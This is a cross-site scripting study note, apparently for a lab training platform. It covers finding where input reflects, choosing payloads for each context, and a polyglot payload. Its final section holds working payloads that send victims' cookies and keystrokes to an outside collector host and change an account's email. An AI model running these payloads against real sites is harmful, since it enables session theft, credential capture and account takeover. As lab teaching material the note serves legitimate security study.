# Cross-Site Scripting (XSS)

Your input ends up in a page that somebody's browser executes. Whether that is exploitable, and with which payload, is decided entirely by **where** in the document your input lands — the HTML body, an attribute value, inside a `<script>` block, inside a `<textarea>`. There is no universal [[Security-Terms#^xss|XSS]] payload, and trying a list of them against an unknown context is the slowest possible way to work.

So the method is always the same two moves: get a marker to reflect, then read the source around it. Everything else in this note follows from what you see there.

## Find where your input lands

```text
zzprobe7f31'"><svg
```

Then read the raw response, not the rendered page:

```bash
curl -s 'http://target.thm/search?q=zzprobe7f31%27%22%3E%3Csvg' | grep -n -C2 zzprobe7f31
```

- a unique alphanumeric marker → `zzprobe7f31` appears nowhere else in the document, so `grep` finds every reflection point at once. `test` or `XSS` collide with the page's own content
- `'"><` in one probe → each character tests a different escape, and the response tells you which ones survived. This one string answers "am I in an attribute", "am I in a string", "can I open a tag" in a single request
- `curl` and `grep -C2`, not the browser → **the step that is easy to skip and costs the most.** The rendered DOM shows you what the browser made of the page; view-source and `curl` show what the server actually sent. An escaped `&lt;` looks identical to a working `<` in the rendered view, and that difference is the entire question
- URL-encode the probe for transport (`%27%22%3E`), or the shell and the server will each eat part of it
- check every reflection point — the same input often lands in three places with three different encodings, and only one of them is exploitable

## Pick the payload from the context

```html
<script>alert(1)</script>                      <!-- 1: loose in the HTML body -->
"><script>alert(1)</script>                    <!-- 2: inside an attribute value -->
</textarea><script>alert(1)</script>           <!-- 3: inside a textarea -->
';alert(1);//                                  <!-- 4: inside an existing JS string -->
<sscriptcript>alert(1)</sscriptcript>          <!-- 5: naive one-pass word filter -->
x" onload="alert(1)                            <!-- 6: < and > filtered, attribute reachable -->
```

- **1 — HTML body.** Nothing to escape; the tag runs as written. If this fails while the marker reflected cleanly, a Content-Security-Policy is the usual reason
- **2 — attribute value.** `"` closes the value, `>` closes the tag, then a fresh tag runs. Check which quote the attribute actually uses: a `'`-quoted attribute needs `'>`, and using the wrong one is a silent no-op
- **3 — textarea.** Its content is literal text, so you must close the element first. The same applies inside `<title>`, `<style>` and comments, each with its own closing tag
- **4 — inside JavaScript.** `'` closes the string literal, `;` ends the statement, `//` comments out the remainder so the original line does not throw a syntax error. **Omit the `//` and the broken tail can abort the whole script block before your code runs** — which looks exactly like a failed injection
- **5 — one-pass word filter.** A filter that removes `script` once, without repeating, leaves `<script>` behind when the word is nested inside itself. A filter that loops until no match remains defeats this entirely, so this is a probe of the filter's design as much as a payload
- **6 — characters filtered, not words.** With `<` and `>` gone you cannot create a tag, so use one that already exists: break out of its attribute and add an event handler. `onload`, `onerror`, `onfocus autofocus`, `onmouseover` are the usual four
- swap `alert(1)` for `alert(document.domain)` → it prints which origin executed, which matters when the page embeds frames from elsewhere and you cannot otherwise tell whose context you are in

## When you do not know the context yet

```text
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

- keep it in a fenced block → it contains backticks of its own, and inline code formatting breaks the payload silently
- mixed case (`jaVasCript`, `oNcliCk`) → defeats case-sensitive blocklists; HTML and JS do not care
- the closing tags in the middle → each one escapes a different container, which is what makes one string work in several places
- swap `alert()` for a distinguishable marker such as `alert(1)` in field one, `alert(2)` in field two → with several fields in play, an alert with no identity tells you something fired but not what. **The omission that turns a successful sweep into a second sweep**

## Turn it into impact

```html
<script>fetch('https://collector.thm/s?c='+btoa(document.cookie))</script>
<script>document.onkeypress=function(e){fetch('https://collector.thm/k?k='+btoa(e.key))}</script>
<script>user.changeEmail('attacker@collector.thm')</script>
```

- **session theft** — `document.cookie` gives you the victim's session, and `btoa()` base64s it so that cookie characters survive the URL. The critical limitation: a cookie with the `HttpOnly` flag is invisible to JavaScript and this payload returns an empty string. Check the `Set-Cookie` header before spending time here
- **key logging** — catches credentials that never reach a cookie, which is the answer when `HttpOnly` closes the route above. Needs the victim to stay on the page and type
- **application actions** — the most valuable and the most target-specific. Your script runs as the victim, so it can call whatever the application's own JavaScript can: change an email, create a user, approve a request. Read the site's own JS to find the function names
- your collector must be reachable from the victim's browser, and you must be watching it. A request that arrives while nothing is listening is a finding you will never know you got
- stored XSS is what makes these worth anything — a reflected payload requires you to deliver the URL to a victim, while a stored one waits for them
